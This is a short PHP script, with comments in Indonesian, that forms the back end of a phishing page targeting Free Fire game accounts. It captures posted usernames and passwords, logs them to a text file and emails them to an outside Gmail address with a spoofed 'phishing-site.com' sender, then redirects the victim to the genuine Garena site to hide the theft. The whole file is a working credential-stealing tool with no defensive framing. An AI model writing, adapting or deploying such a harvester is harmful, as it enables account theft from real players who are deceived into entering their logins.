<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Simpan ke file teks (opsional, sebagai backup)
    $file = 'data.txt';
    $data = "Username: $username | Password: $password\n";
    file_put_contents($file, $data, FILE_APPEND);
    
    // Kirim ke email
    $to = "zeinhasiholan@gmail.com";
    $subject = "Data Login Free Fire Baru";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: noreply@phishing-site.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();
    
    mail($to, $subject, $message, $headers);
    
    // Redirect ke halaman asli
    header('Location: https://ff.garena.com/');
    exit();
}
?>
